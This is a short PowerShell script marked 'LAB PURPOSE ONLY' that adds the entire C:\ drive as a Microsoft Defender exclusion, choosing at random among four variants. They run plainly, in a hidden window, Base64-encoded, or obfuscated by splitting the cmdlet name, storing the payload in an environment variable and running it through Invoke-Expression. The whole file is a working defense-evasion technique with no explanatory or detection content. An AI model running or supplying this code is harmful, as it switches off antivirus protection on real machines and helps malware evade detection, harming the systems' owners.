# PowerShell Script: Add-Exclusion.ps1
# LAB PURPOSE ONLY

# Randomly pick a version
$version = Get-Random -Minimum 1 -Maximum 5

Write-Host "Selected Version: $version" -ForegroundColor Cyan

switch ($version) {
    1 {
        # 1 - Clean Version
        Add-MpPreference -ExclusionPath 'C:\'
    }
    2 {
        # 2 - Upgrade Version (hidden process)
        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "Add-MpPreference -ExclusionPath 'C:\'"
    }
    3 {
        # 3 - Modern Version (Base64 Encoded)
        $command = 'Add-MpPreference -ExclusionPath C:\'
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
        $encodedCommand = [Convert]::ToBase64String($bytes)
        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $encodedCommand"
    }
    4 {
        # 4 - Ultra Version (Obfuscated + Encoded + Variable Tricks)
        
        # Create dynamic pieces
        $p1 = 'Add'
        $p2 = '-Mp'
        $p3 = 'Preference'
        $fullCommand = "$p1$p2$p3 -ExclusionPath C:\"

        # Encode full command
        $bytesUltra = [System.Text.Encoding]::Unicode.GetBytes($fullCommand)
        $encodedUltra = [Convert]::ToBase64String($bytesUltra)

        # Set environment variable to hold encoded payload
        $env:payload = $encodedUltra

        # Build runner dynamically
        $runner = 'powershell.exe -NoP -NonI -W Hidden -EncodedCommand ' + $env:payload

        # Execute
        Invoke-Expression $runner
    }
}
